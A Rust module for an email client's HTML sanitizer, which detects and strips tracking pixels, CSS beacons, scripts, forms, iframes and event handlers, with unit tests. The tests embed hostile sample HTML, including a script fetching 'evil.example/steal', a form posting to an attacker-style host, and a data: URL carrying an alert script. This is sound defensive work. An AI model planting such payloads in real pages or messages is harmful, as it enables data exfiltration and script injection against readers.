//! Read-time HTML sanitizer: spy-pixel detection/stripping plus a CSP `srcdoc` builder.
//!
//! Detection runs on the RAW message HTML (before any parsing round-trip) so that
//! `width="1"`, `style="display:none"` and `hidden` signals are still present, then a
//! hardened [ammonia] pass removes anything executable, and the result is embedded in a
//! document with a strict Content-Security-Policy `<meta>`.

use std::borrow::Cow;
use std::collections::HashMap;
use std::sync::OnceLock;

use regex::{Captures, Regex};

use crate::types::{PrivacyReport, RemoteContent, RemoteImagesStatus, TrackerHit, TrackerKind};

/// Known tracker hosts, matched as substrings of the image URL host.
const TRACKER_HOST_TOKENS: &[&str] = &[
    "mailchimp",
    "list-manage",
    "sendgrid",
    "hubspot",
    "mailgun",
    "klaviyo",
    "doubleclick",
    "google-analytics",
    "pixel.",
    "open.",
    "track.",
];

/// Tags dropped together with their content before the ammonia pass.
const DANGEROUS_TAGS: &[&str] = &[
    "script", "iframe", "frame", "frameset", "object", "embed", "form", "applet", "link",
];

/// CSP for [`RemoteContent::BlockAll`]: nothing loads except inline data images.
const CSP_BLOCK_ALL: &str = "default-src 'none'; img-src data:; style-src 'unsafe-inline';";
/// CSP for [`RemoteContent::AllowImagesStripTrackers`]: https images allowed, everything else none.
const CSP_ALLOW_IMAGES: &str =
    "default-src 'none'; img-src data: https:; style-src 'unsafe-inline';";

const BASE_STYLE: &str = "<style>html{box-sizing:border-box;padding:14px 16px!important;}body{margin:0;font-family:Inter,system-ui,sans-serif;font-size:13px;line-height:1.6;color:inherit;}img{max-width:100%;height:auto;}a{color:#4f86ff;}</style>";

/// A fully sanitized HTML document ready to be used as an iframe `srcdoc`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HtmlDocument(String);

impl HtmlDocument {
    pub fn as_str(&self) -> &str {
        &self.0
    }

    pub fn into_inner(self) -> String {
        self.0
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SanitizedBody {
    pub srcdoc: HtmlDocument,
    pub privacy: PrivacyReport,
}

fn re(cell: &'static OnceLock<Regex>, pattern: &str) -> &'static Regex {
    cell.get_or_init(|| Regex::new(pattern).expect("static sanitizer regex"))
}

fn re_style_block() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_url_func() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_import() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_import_quoted() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_img_tag() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_attr() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_hidden_attr() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_style_attr() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_background_attr() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_event_attr() -> &'static OnceLock<Regex> {
    static RE: OnceLock<Regex> = OnceLock::new();
    &RE
}
fn re_dangerous_tags() -> &'static Vec<(Regex, Regex)> {
    static RE: OnceLock<Vec<(Regex, Regex)>> = OnceLock::new();
    RE.get_or_init(|| {
        DANGEROUS_TAGS
            .iter()
            .map(|tag| {
                let paired = Regex::new(&format!(r"(?is)<{tag}\b[^>]*>.*?</{tag}\s*>"))
                    .expect("static paired tag regex");
                let singles = Regex::new(&format!(r"(?is)</?{tag}\b[^>]*>"))
                    .expect("static single tag regex");
                (paired, singles)
            })
            .collect()
    })
}

/// Result of scanning raw message HTML: transformed markup plus privacy statistics.
struct Scan {
    html: String,
    trackers: Vec<TrackerHit>,
    remote_removed: u32,
    remote_kept: u32,
}

/// Sanitize raw message HTML for the given remote-content policy.
///
/// Returns the CSP-embedded document and an accurate [`PrivacyReport`]: every remote
/// image reference that was stripped under [`RemoteContent::BlockAll`], and under
/// [`RemoteContent::AllowImagesStripTrackers`] only trackers (and non-https images) are
/// stripped while safe https images survive.
pub fn sanitize_html(raw_html: &str, policy: RemoteContent) -> SanitizedBody {
    let scan = transform(raw_html, policy);
    let cleaned = ammonia_clean(&scan.html);
    let csp = match policy {
        RemoteContent::BlockAll => CSP_BLOCK_ALL,
        RemoteContent::AllowImagesStripTrackers => CSP_ALLOW_IMAGES,
    };
    let doc = format!(
        "<!doctype html><html><head><meta charset=\"utf-8\"><meta http-equiv=\"Content-Security-Policy\" content=\"{csp}\">{BASE_STYLE}</head><body>{cleaned}</body></html>"
    );

    let remote_images = match policy {
        RemoteContent::BlockAll => {
            if scan.remote_removed > 0 {
                RemoteImagesStatus::Blocked {
                    count: scan.remote_removed,
                }
            } else {
                RemoteImagesStatus::None
            }
        }
        RemoteContent::AllowImagesStripTrackers => {
            if scan.remote_kept > 0 {
                RemoteImagesStatus::Allowed
            } else if scan.remote_removed > 0 {
                RemoteImagesStatus::Blocked {
                    count: scan.remote_removed,
                }
            } else {
                RemoteImagesStatus::None
            }
        }
    };

    SanitizedBody {
        srcdoc: HtmlDocument(doc),
        privacy: PrivacyReport {
            remote_images,
            trackers: scan.trackers,
        },
    }
}

/// Detect every tracker embedded in raw message HTML without producing a document.
///
/// Used at ingest time to populate `thread.trackers_blocked`.
pub fn detect_trackers(raw_html: &str) -> Vec<TrackerHit> {
    transform(raw_html, RemoteContent::AllowImagesStripTrackers).trackers
}

/// Render a plain-text message body (no HTML part) as sanitized HTML.
pub fn text_to_html(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 16);
    let mut chars = text.char_indices().peekable();
    while let Some((_, c)) = chars.next() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#39;"),
            '\n' => {
                // `text\r\n` renders as a single break.
                if chars.peek().is_some_and(|(_, n)| *n == '\r') {
                    chars.next();
                }
                out.push_str("<br>\n");
            }
            '\r' => {
                if chars.peek().is_some_and(|(_, n)| *n == '\n') {
                    chars.next();
                }
                out.push_str("<br>\n");
            }
            other => out.push(other),
        }
    }
    out
}

fn transform(raw: &str, policy: RemoteContent) -> Scan {
    let mut trackers: Vec<TrackerHit> = Vec::new();
    let mut remote_removed = 0u32;
    let mut remote_kept = 0u32;
    let mut html = raw.to_string();

    // 1. CSS `url()` and `@import` beacons inside <style> blocks — always stripped,
    //    even if the <style> block is unclosed.
    let style_block = re(re_style_block(), r"(?is)<style\b[^>]*>(.*?)(?:</style\s*>|\z)");
    html = style_block
        .replace_all(&html, |caps: &Captures<'_>| {
            let inner = caps.get(1).map(|m| m.as_str()).unwrap_or("");
            let (scrubbed, hits, removed) = scrub_css(inner);
            trackers.extend(hits);
            remote_removed += removed;
            format!("<style>{scrubbed}</style>")
        })
        .into_owned();

    // 2. Inline `style="…"` / `style=…` attributes: scrub CSS beacons there too.
    let style_attr = re(
        re_style_attr(),
        r#"(?is)\bstyle\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'`=<>]+))"#,
    );
    html = style_attr
        .replace_all(&html, |caps: &Captures<'_>| {
            let value = caps
                .get(1)
                .or_else(|| caps.get(2))
                .or_else(|| caps.get(3))
                .map(|m| m.as_str())
                .unwrap_or("");
            let (scrubbed, hits, removed) = scrub_css(value);
            trackers.extend(hits);
            remote_removed += removed;
            format!("style=\"{scrubbed}\"")
        })
        .into_owned();

    // 3. <img> elements: pixel / hidden / known-tracker detection and policy stripping.
    let img_tag = re(re_img_tag(), r"(?is)<img\b[^>]*>");
    html = img_tag
        .replace_all(&html, |caps: &Captures<'_>| {
            let tag = caps.get(0).map(|m| m.as_str()).unwrap_or("");
            let attrs = parse_attrs(tag);
            let src = attrs.get("src").cloned().unwrap_or_default();
            let (scheme, host) = match image_origin(&src) {
                Some((scheme, host)) => (Some(scheme), Some(host)),
                None => (None, None),
            };

            let mut kind: Option<TrackerKind> = None;
            for dim_key in ["width", "height"] {
                if kind.is_none()
                    && attrs
                        .get(dim_key)
                        .and_then(|v| parse_dim(v))
                        .is_some_and(|d| d <= 1)
                {
                    kind = Some(TrackerKind::Pixel1x1);
                }
            }
            if kind.is_none() {
                let hidden_style = attrs.get("style").is_some_and(|s| is_hidden_style(s));
                if hidden_style
                    || re(re_hidden_attr(), r"(?i)(?:^|\s)hidden(?:[\s/>]|$)").is_match(tag)
                {
                    kind = Some(TrackerKind::HiddenImage);
                }
            }
            let is_tracker_host = host.as_deref().is_some_and(tracker_host);
            if kind.is_none() && is_tracker_host {
                kind = Some(TrackerKind::KnownDomain);
            }

            let is_remote = scheme.is_some();
            let mut remove = false;
            if let Some(kind) = kind {
                trackers.push(TrackerHit {
                    host: host.unwrap_or_default(),
                    kind,
                });
                remove = true;
                if is_remote {
                    remote_removed += 1;
                }
            } else if is_remote {
                match policy {
                    RemoteContent::BlockAll => {
                        remove = true;
                        remote_removed += 1;
                    }
                    RemoteContent::AllowImagesStripTrackers => {
                        if scheme == Some("https") {
                            remote_kept += 1;
                        } else {
                            // Plain http is not a safe image source.
                            remove = true;
                            remote_removed += 1;
                        }
                    }
                }
            }

            if remove {
                String::new()
            } else {
                tag.to_string()
            }
        })
        .into_owned();

    // 4. Legacy `background="…"` attributes behave like image loads.
    let background = re(
        re_background_attr(),
        r#"(?is)\sbackground\s*=\s*("([^"]*)"|'([^']*)'|([^\s>]+))"#,
    );
    html = background
        .replace_all(&html, |caps: &Captures<'_>| {
            let value = caps
                .get(2)
                .or_else(|| caps.get(3))
                .or_else(|| caps.get(4))
                .map(|m| m.as_str())
                .unwrap_or("");
            let Some((scheme, host)) = image_origin(value) else {
                return caps
                    .get(0)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default();
            };
            let is_tracker = tracker_host(&host);
            if is_tracker {
                trackers.push(TrackerHit {
                    host,
                    kind: TrackerKind::KnownDomain,
                });
            }
            let strip = is_tracker
                || matches!((policy, scheme), (RemoteContent::BlockAll, _) | (_, "http"));
            if strip {
                remote_removed += 1;
                String::new()
            } else {
                remote_kept += 1;
                caps.get(0)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default()
            }
        })
        .into_owned();

    // 5. Scripts, frames, forms, and friends — dropped with their content.
    for (paired, singles) in re_dangerous_tags() {
        html = paired.replace_all(&html, "").into_owned();
        html = singles.replace_all(&html, "").into_owned();
    }

    // 6. Inline event handlers (onerror, onload, …) never survive.
    let event_attr = re(
        re_event_attr(),
        r#"(?is)\son[a-z]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)"#,
    );
    html = event_attr.replace_all(&html, "").into_owned();

    Scan {
        html,
        trackers,
        remote_removed,
        remote_kept,
    }
}

/// Strip remote `url()` beacons and `@import` rules from a CSS fragment.
fn scrub_css(css: &str) -> (String, Vec<TrackerHit>, u32) {
    let mut hits = Vec::new();
    let mut removed = 0u32;

    let import_re = re(
        re_import(),
        r#"(?is)@import\s+(?:url\(\s*["']?[^"')]+["']?\s*\)|["'][^"']+["'])\s*;?"#,
    );
    let mut out = import_re
        .replace_all(css, |caps: &Captures<'_>| {
            let text = caps.get(0).map(|m| m.as_str()).unwrap_or("");
            if let Some((_, host)) = first_remote_url(text) {
                hits.push(TrackerHit {
                    host,
                    kind: TrackerKind::CssBeacon,
                });
                removed += 1;
                String::new()
            } else {
                text.to_string()
            }
        })
        .into_owned();

    let url_re = re(re_url_func(), r#"(?is)url\(\s*["']?([^"')]+)["']?\s*\)"#);
    out = url_re
        .replace_all(&out, |caps: &Captures<'_>| {
            let url = caps.get(1).map(|m| m.as_str()).unwrap_or("").trim();
            if let Some((scheme, host)) = image_origin(url) {
                let _ = scheme;
                hits.push(TrackerHit {
                    host,
                    kind: TrackerKind::CssBeacon,
                });
                removed += 1;
                "none".to_string()
            } else {
                caps.get(0)
                    .map(|m| m.as_str().to_string())
                    .unwrap_or_default()
            }
        })
        .into_owned();

    (out, hits, removed)
}

fn first_remote_url(text: &str) -> Option<(&'static str, String)> {
    let url_re = re(re_url_func(), r#"(?is)url\(\s*["']?([^"')]+)["']?\s*\)"#);
    if let Some(caps) = url_re.captures(text) {
        let url = caps.get(1).map(|m| m.as_str()).unwrap_or("").trim();
        if let Some(origin) = image_origin(url) {
            return Some(origin);
        }
    }
    // `@import "https://…"` form.
    let quoted = re(re_import_quoted(), r#"(?is)@import\s+["']([^"']+)["']"#);
    if let Some(caps) = quoted.captures(text) {
        let url = caps.get(1).map(|m| m.as_str()).unwrap_or("").trim();
        if let Some(origin) = image_origin(url) {
            return Some(origin);
        }
    }
    None
}

fn parse_attrs(tag: &str) -> HashMap<String, String> {
    let attr_re = re(
        re_attr(),
        r#"(?is)([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*("([^"]*)"|'([^']*)'|([^\s"'`=<>]+))"#,
    );
    let mut map = HashMap::new();
    for caps in attr_re.captures_iter(tag) {
        let name = caps[1].to_ascii_lowercase();
        let value = caps
            .get(3)
            .or_else(|| caps.get(4))
            .or_else(|| caps.get(5))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        map.entry(name).or_insert(value);
    }
    map
}

/// Returns `(scheme, host)` for an http(s) URL, or `(None, None)` for data:, cid:, relative…
fn image_origin(url: &str) -> Option<(&'static str, String)> {
    let trimmed = url.trim();
    let scheme = if trimmed
        .get(..8)
        .is_some_and(|p| p.eq_ignore_ascii_case("https://"))
    {
        "https"
    } else if trimmed
        .get(..7)
        .is_some_and(|p| p.eq_ignore_ascii_case("http://"))
    {
        "http"
    } else {
        return None;
    };
    let rest = &trimmed[scheme.len() + 3..];
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    let host_part = authority.rsplit('@').next().unwrap_or("");
    let host = host_part.to_ascii_lowercase();
    if host.is_empty() {
        return None;
    }
    Some((scheme, host))
}

fn tracker_host(host: &str) -> bool {
    let host = host.to_ascii_lowercase();
    TRACKER_HOST_TOKENS.iter().any(|token| host.contains(token))
}

fn parse_dim(value: &str) -> Option<i64> {
    let cleaned = value.trim().trim_end_matches("px").trim();
    cleaned.parse::<i64>().ok()
}

fn is_hidden_style(style: &str) -> bool {
    let norm: String = style
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect::<String>()
        .to_ascii_lowercase();
    if norm.contains("display:none") || norm.contains("visibility:hidden") || opacity_zero(&norm) {
        return true;
    }

    let mut css_width: Option<f32> = None;
    let mut css_height: Option<f32> = None;
    for decl in norm.split(';') {
        let Some((prop, raw_val)) = decl.split_once(':') else {
            continue;
        };
        let val = raw_val.trim_end_matches("!important");
        match prop {
            "width" => {
                if let Some(px) = parse_css_px_dim(val) {
                    if px == 0.0 {
                        return true;
                    }
                    css_width = Some(px);
                }
            }
            "height" => {
                if let Some(px) = parse_css_px_dim(val) {
                    if px == 0.0 {
                        return true;
                    }
                    css_height = Some(px);
                }
            }
            _ => {}
        }
    }

    matches!((css_width, css_height), (Some(w), Some(h)) if w <= 1.0 && h <= 1.0)
}

/// Parse a CSS length like `0`, `0px`, `0em`, `1px`, or `1` into pixels (returns `Some(0.0)`
/// for any zero-valued length, or `Some(v)` for unitless / `px` lengths).
fn parse_css_px_dim(val: &str) -> Option<f32> {
    if let Some(num) = val.strip_suffix("px") {
        return num.parse::<f32>().ok().filter(|v| *v >= 0.0);
    }
    if let Ok(v) = val.parse::<f32>() {
        return (v >= 0.0).then_some(v);
    }
    let num_prefix: String = val
        .chars()
        .take_while(|c| c.is_ascii_digit() || *c == '.')
        .collect();
    if !num_prefix.is_empty() && num_prefix.parse::<f32>().is_ok_and(|v| v == 0.0) {
        return Some(0.0);
    }
    None
}

/// `opacity:0` (with no fractional part) means invisible.
fn opacity_zero(norm: &str) -> bool {
    let mut idx = 0usize;
    while let Some(pos) = norm[idx..].find("opacity:") {
        let start = idx + pos + "opacity:".len();
        let num: String = norm[start..]
            .chars()
            .take_while(|c| c.is_ascii_digit() || *c == '.')
            .collect();
        if num.parse::<f32>().is_ok_and(|v| v == 0.0) {
            return true;
        }
        idx = start;
    }
    false
}

fn ammonia_clean(html: &str) -> String {
    let mut builder = ammonia::Builder::default();
    // Keep email styling (CSP `style-src 'unsafe-inline'` covers it) but never scripts.
    builder.rm_clean_content_tags(&["style"]);
    builder.add_tags(&["style"]);
    builder.add_generic_attributes(&["style", "class"]);
    // Allow `data:` only for `img[src]` so inline logo/data images survive under BlockAll
    // without allowing `data:` on links (`<a href="data:text/html,...">`) or other elements.
    builder.add_url_schemes(&["data"]);
    builder.attribute_filter(|element, attribute, value| {
        let trimmed = value.trim_start();
        if trimmed
            .get(..5)
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case("data:"))
            && !(element == "img" && attribute == "src")
        {
            return None;
        }
        Some(Cow::Borrowed(value))
    });
    builder.clean(html).to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    const SPY_HTML: &str = r#"
        <html><body>
        <h1>Design Dispatch #142</h1>
        <p>Hero below.</p>
        <img src="https://cdn.dispatch.design/hero.jpg" width="600" height="300" alt="hero">
        <img src="https://gallery.mailchimp.com/abc/images/1x1.gif" width="1" height="1" alt="">
        <img src="https://assets.example.com/logo.png" style="display:none" alt="">
        <img src="https://ci.google-analytics.com/px.gif?u=1" alt="">
        <img src="https://cdn.example.com/transparent.gif" width="0" height="0">
        <div style="background-image:url('https://track.dispatch.design/p.gif?r=142');height:1px"></div>
        <img src="data:image/gif;base64,R0lGOD" width="60" alt="inline">
        <script>fetch("https://evil.example/steal")</script>
        <form action="https://evil.example/collect"><input name="q"></form>
        <iframe src="https://evil.example/frame"></iframe>
        <p onclick="steal()">Hover me</p>
        </body></html>
    "#;

    #[test]
    fn block_all_strips_every_remote_image_and_reports_count() {
        let out = sanitize_html(SPY_HTML, RemoteContent::BlockAll);
        let html = out.srcdoc.as_str();

        // Every remote URL is gone, inline data image survives.
        assert!(!html.contains("cdn.dispatch.design/hero.jpg"));
        assert!(!html.contains("mailchimp"));
        assert!(!html.contains("google-analytics"));
        assert!(!html.contains("track.dispatch.design"));
        assert!(html.contains("data:image/gif;base64"));

        // Strict CSP exactly as specified.
        assert!(html.contains(&format!(
            "<meta http-equiv=\"Content-Security-Policy\" content=\"{CSP_BLOCK_ALL}\">"
        )));

        // 5 remote images + 1 css beacon = 6 blocked; data: image is not remote.
        match out.privacy.remote_images {
            RemoteImagesStatus::Blocked { count } => assert_eq!(count, 6),
            other => panic!("expected Blocked, got {other:?}"),
        }
        assert!(out.privacy.trackers.len() >= 4);
    }

    #[test]
    fn allow_policy_keeps_safe_https_strips_trackers() {
        let out = sanitize_html(SPY_HTML, RemoteContent::AllowImagesStripTrackers);
        let html = out.srcdoc.as_str();

        // Safe https hero + inline data image survive.
        assert!(html.contains("https://cdn.dispatch.design/hero.jpg"));
        assert!(html.contains("data:image/gif;base64"));

        // Trackers and CSS beacons do not, even with images allowed.
        assert!(!html.contains("mailchimp"));
        assert!(!html.contains("google-analytics"));
        assert!(!html.contains("assets.example.com/logo.png")); // display:none
        assert!(!html.contains("track.dispatch.design"));
        assert!(!html.contains("transparent.gif")); // 0x0

        // Scripts/forms/iframes/event handlers are gone.
        assert!(!html.contains("<script"));
        assert!(!html.contains("evil.example/steal"));
        assert!(!html.contains("<form"));
        assert!(!html.contains("<iframe"));
        assert!(!html.contains("onclick"));

        // CSP allows https images but still locks everything else down.
        assert!(html.contains(&format!(
            "<meta http-equiv=\"Content-Security-Policy\" content=\"{CSP_ALLOW_IMAGES}\">"
        )));

        match out.privacy.remote_images {
            RemoteImagesStatus::Allowed => {}
            other => panic!("expected Allowed, got {other:?}"),
        }

        let kinds: Vec<TrackerKind> = out.privacy.trackers.iter().map(|t| t.kind).collect();
        assert!(kinds.contains(&TrackerKind::Pixel1x1));
        assert!(kinds.contains(&TrackerKind::HiddenImage));
        assert!(kinds.contains(&TrackerKind::KnownDomain));
        assert!(kinds.contains(&TrackerKind::CssBeacon));
    }

    #[test]
    fn known_tracker_hosts_are_detected_regardless_of_size() {
        let html = r#"<img src="https://a.hubspot.net/collect.gif" width="40" height="40">"#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        assert!(out.srcdoc.as_str().contains("img") && !out.srcdoc.as_str().contains("hubspot"));
        assert_eq!(out.privacy.trackers.len(), 1);
        assert_eq!(out.privacy.trackers[0].kind, TrackerKind::KnownDomain);
        assert_eq!(out.privacy.trackers[0].host, "a.hubspot.net");
    }

    #[test]
    fn plain_http_images_are_not_safe_under_allow_policy() {
        let html = r#"<img src="http://example.com/a.png" width="100">"#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        assert!(!out.srcdoc.as_str().contains("http://example.com"));
        assert!(matches!(
            out.privacy.remote_images,
            RemoteImagesStatus::Blocked { count: 1 }
        ));
    }

    #[test]
    fn message_without_remote_content_reports_none() {
        let html = r#"<p>Hello <strong>world</strong></p>"#;
        for policy in [
            RemoteContent::BlockAll,
            RemoteContent::AllowImagesStripTrackers,
        ] {
            let out = sanitize_html(html, policy);
            assert_eq!(out.privacy.remote_images, RemoteImagesStatus::None);
            assert!(out.privacy.trackers.is_empty());
            assert!(out.srcdoc.as_str().contains("Hello"));
        }
    }

    #[test]
    fn css_import_beacons_are_stripped() {
        let html = r#"<style>@import url("https://evil.example/skin.css"); body{color:red}</style><p>hi</p>"#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        assert!(!out.srcdoc.as_str().contains("evil.example"));
        assert!(out.srcdoc.as_str().contains("color:red"));
        assert!(out
            .privacy
            .trackers
            .iter()
            .any(|t| t.kind == TrackerKind::CssBeacon));
    }

    #[test]
    fn detect_trackers_finds_spy_pixels_without_building_a_document() {
        let hits = detect_trackers(SPY_HTML);
        assert!(hits.len() >= 4);
    }

    #[test]
    fn text_to_html_escapes_and_breaks_lines() {
        assert_eq!(text_to_html("a < b & c\nd"), "a &lt; b &amp; c<br>\nd");
    }

    #[test]
    fn unclosed_style_block_still_scrubs_beacons_and_imports() {
        let html = r#"<style>@import url("https://evil.example/a.css"); body { background: url("https://evil.example/p.gif"); color: green; }<p>hi</p>"#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        assert!(!out.srcdoc.as_str().contains("evil.example"));
        assert!(out
            .privacy
            .trackers
            .iter()
            .any(|t| t.kind == TrackerKind::CssBeacon));
    }

    #[test]
    fn unquoted_style_attribute_is_scrubbed() {
        let html = r#"<div style=background:url(https://evil.example/beacon.gif)>hi</div>"#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        assert!(!out.srcdoc.as_str().contains("evil.example"));
        assert!(out
            .privacy
            .trackers
            .iter()
            .any(|t| t.kind == TrackerKind::CssBeacon));
    }

    #[test]
    fn data_scheme_allowed_only_on_img_src() {
        let html = r#"<a href="data:text/html,<script>alert(1)</script>">click</a><img src="data:image/gif;base64,R0lGOD" width="60">"#;
        let out = sanitize_html(html, RemoteContent::BlockAll);
        let doc = out.srcdoc.as_str();
        assert!(!doc.contains("data:text/html"));
        assert!(doc.contains("data:image/gif;base64,R0lGOD"));
    }

    #[test]
    fn css_sized_tracking_pixels_are_flagged_and_stripped() {
        let html = r#"
            <img src="https://cdn.example.com/zero-w.gif" style="width:0;height:10px">
            <img src="https://cdn.example.com/zero-h.gif" style="height: 0px !important">
            <img src="https://cdn.example.com/one-by-one.gif" style="width: 1px; height: 1px;">
            <img src="https://cdn.example.com/visible.png" style="width: 200px; height: 100px;">
        "#;
        let out = sanitize_html(html, RemoteContent::AllowImagesStripTrackers);
        let doc = out.srcdoc.as_str();
        assert!(!doc.contains("zero-w.gif"));
        assert!(!doc.contains("zero-h.gif"));
        assert!(!doc.contains("one-by-one.gif"));
        assert!(doc.contains("visible.png"));
        assert_eq!(
            out.privacy
                .trackers
                .iter()
                .filter(|t| t.kind == TrackerKind::HiddenImage)
                .count(),
            3
        );
    }

    #[test]
    fn sanitized_document_includes_frame_padding() {
        let out = sanitize_html("<p>Hello</p>", RemoteContent::BlockAll);
        assert!(out
            .srcdoc
            .as_str()
            .contains("html{box-sizing:border-box;padding:14px 16px!important;}"));
    }
}
